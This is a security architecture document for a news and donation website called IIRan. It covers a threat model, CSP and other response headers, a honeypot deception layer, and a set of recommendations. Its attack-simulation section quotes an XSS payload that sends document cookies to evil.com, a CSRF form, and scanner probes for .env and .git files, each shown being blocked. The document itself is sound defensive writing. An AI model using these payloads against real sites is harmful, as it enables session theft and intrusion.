# IIRan Security Architecture

## 1. Threat Model

### Assets (by criticality)

| Asset | CIA Priority | Impact if Compromised |
|---|---|---|
| **Donation flow (crypto)** | I-A | Revenue loss, donor trust destruction |
| **User-facing content (news/stories)** | I | Misinformation injection, reputation damage |
| **Infrastructure credentials (env vars)** | C | Lateral movement to all services |
| **DNS / domain** | A-I | Phishing, defacement, total takeover |
| **Source code** | C | Vulnerability discovery, supply chain attack |

### Attack Surfaces & Mitigations Applied

| Surface | Threats | Mitigation |
|---|---|---|
| **Frontend (all pages)** | XSS (reflected/stored/DOM), clickjacking, data exfiltration | Strict CSP with nonce + strict-dynamic, X-Frame-Options: DENY, frame-ancestors 'none' |
| **Image proxy (`/_next/image`)** | SSRF via image URL, resource exhaustion | Explicit hostname allowlist, size limits, cache TTL |
| **News pipeline (server-side fetch)** | SSRF, XML injection via RSS | Server-side only (never exposes fetch URLs to client), RSS parsed with regex (no XML parser execution) |
| **Deception honeypot routes** | Scanner enumeration, credential probing | Fake admin/env/git/API routes, behavioral fingerprinting, adaptive rate limiting |
| **Static assets** | Cache poisoning | Immutable hashes via Next.js build, CDN cache headers |

### Adversary Capability Matrix

| Adversary | Capability | Primary Targets | Defenses Active |
|---|---|---|---|
| Script kiddies | Automated scanners, known CVEs | Open ports, default configs | Middleware headers, deception layer, no version disclosure |
| Botnets | Volumetric DDoS, credential stuffing | `/api/*`, homepage | Adaptive rate limiting, CDN/WAF (recommended) |
| Insider threat | Source code access, env vars | `.env.local`, git history | Never commit secrets, least privilege, audit logging |
| Nation-state APT | Zero-days, supply chain, DNS hijack | Full infrastructure | CSP, dependency pinning, HSTS preload, mTLS (recommended) |

---

## 2. Implemented Security Controls

### 2.1 Edge Middleware (`src/middleware.ts`)

Runs on EVERY request before it reaches application code:

**Origin Validation:**
- All mutating API requests (POST/PUT/PATCH/DELETE) must have an `origin` header matching the allowlist
- Blocks CSRF attacks at the edge before any business logic executes

**Deception Layer:**
- Behavioral fingerprinting and automation detection on all requests
- Tripwire detection for scanner probes (admin paths, env files, git endpoints)
- Suspicion-based adaptive delays (tarpit) for hostile sessions
- Navigation pattern analysis to detect automated crawlers

**Security Headers (applied to all responses):**

| Header | Value | Why |
|---|---|---|
| `Content-Security-Policy` | `default-src 'self'; script-src 'self' 'nonce-{random}' 'strict-dynamic'; ...` | Eliminates XSS. Nonce-based means even if an attacker injects HTML, no script executes without the per-request nonce. `strict-dynamic` allows Next.js hydration scripts. |
| `X-Frame-Options` | `DENY` | Prevents clickjacking. No page can be embedded in an iframe. |
| `X-Content-Type-Options` | `nosniff` | Prevents MIME confusion attacks (browser won't execute a .txt as .js). |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Limits referrer leakage. Same-origin gets full URL; cross-origin gets only origin. |
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` | Forces HTTPS for 2 years. Preload-eligible for browser HSTS lists. Prevents SSL stripping. |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=(), ...` | Disables all browser APIs not needed. Blocks FLoC tracking. |
| `Cross-Origin-Opener-Policy` | `same-origin` | Prevents Spectre-class side-channel attacks via `window.opener`. |
| `Cross-Origin-Resource-Policy` | `same-origin` | Prevents cross-origin resource theft. |
| `X-DNS-Prefetch-Control` | `off` | Prevents DNS prefetch abuse for tracking. |
| `X-Permitted-Cross-Domain-Policies` | `none` | Blocks Flash/PDF cross-domain requests. |

**API Cache Control:**
- All `/api/*` responses: `no-store, no-cache, must-revalidate, proxy-revalidate`
- Prevents CDN/proxy from caching sensitive API responses

### 2.2 Deception Engine (`src/lib/deception/`)

Four-module counter-intelligence system:

- **Threat Intelligence** (`threat-intel.ts`): Behavioral fingerprinting, threat scoring, automation detection
- **Honeypots** (`honeypots.ts`): Fake admin pages, env files, git content, API responses to trap scanners
- **Response Shaping** (`response-shaping.ts`): Dynamic header manipulation, computed delays for suspicious actors
- **Adaptive Defense** (`adaptive-defense.ts`): Self-adjusting rate limits based on threat score, session classification, navigation pattern analysis

### 2.3 Security Utilities (`src/lib/security.ts`)

- Client IP extraction supporting Cloudflare, Vercel, and standard proxy headers
- URL sanitization for external content: rejects `javascript:`, `data:`, `vbscript:` schemes

### 2.4 Next.js Configuration Hardening

- `poweredByHeader: false` - removes `X-Powered-By: Next.js` (information disclosure)
- `productionBrowserSourceMaps: false` - no source maps shipped to browsers
- Explicit image hostname allowlist (SSRF prevention via image proxy)
- Image size limits and cache TTL

---

## 3. Attack Simulation: How Attacks Are Stopped

### Attack 1: XSS Injection
```
Attacker: Injects <script>fetch('https://evil.com/steal?c='+document.cookie)</script> via news content
Defense chain:
  1. CSP blocks: script has no valid nonce -> browser refuses execution
  2. frame-ancestors 'none': can't embed in attacker iframe
  3. HttpOnly cookies (recommended): even if XSS succeeds, cookies invisible to JS
Result: BLOCKED at browser level
```

### Attack 2: CSRF on API Routes
```
Attacker: <form action="https://iiran.org/api/internal/sync" method="POST">
Defense chain:
  1. Middleware checks Origin header -> attacker's origin not in allowlist
  2. Returns 403 Forbidden before route handler executes
Result: BLOCKED at middleware
```

### Attack 3: Scanner Probing
```
Attacker: Automated scan of /admin, /.env, /.git/config, /api/v1/users
Defense chain:
  1. Tripwire detection identifies scanner paths
  2. Behavioral fingerprint recorded, threat score elevated
  3. Fake responses returned (plausible admin page, fake env, fake git config)
  4. Attacker wastes time on decoy data while real paths remain hidden
Result: MISDIRECTED - attacker engages with fake data
```

### Attack 4: Information Disclosure
```
Attacker: Probes error responses for stack traces, version info
Defense chain:
  1. poweredByHeader: false -> no framework disclosure
  2. productionBrowserSourceMaps: false -> no source maps
  3. Generic error messages for all API failures
Result: BLOCKED - minimal information leakage
```

---

## 4. Recommendations for Production (Beyond Code)

### Priority 1 (Deploy Immediately)
- [ ] **Cloudflare or AWS WAF** in front of the application (DDoS, bot detection, managed rules)
- [ ] **HSTS Preload submission** at hstspreload.org after deploying with HSTS header
- [ ] **Rotate all secrets** in `.env.local` - they are in the codebase attachment history

### Priority 2 (Within 1 Week)
- [ ] **Redis-backed rate limiter** for multi-instance deployments
- [ ] **Sentry integration** for structured error monitoring
- [ ] **Dependency audit**: run `npm audit` weekly, pin exact versions in package-lock.json
- [ ] **Add `robots.txt`** blocking sensitive paths: `/api/*`

### Priority 3 (Within 1 Month)
- [ ] **Subresource Integrity (SRI)** for any external scripts
- [ ] **Database encryption at rest** in Supabase
- [ ] **Row-Level Security (RLS)** policies in Supabase
- [ ] **Automated SAST scanning** in CI (e.g., Semgrep, CodeQL)
- [ ] **Dependency pinning** with `npm ci` in CI, lock file integrity check

### Priority 4 (Ongoing)
- [ ] **Secret rotation schedule**: API keys quarterly
- [ ] **Penetration testing**: annual third-party assessment
- [ ] **Incident response runbook**: detection -> containment -> key rotation -> forced session invalidation
- [ ] **Monitor CSP violation reports**: add `report-uri` or `report-to` directive when reporting endpoint is available
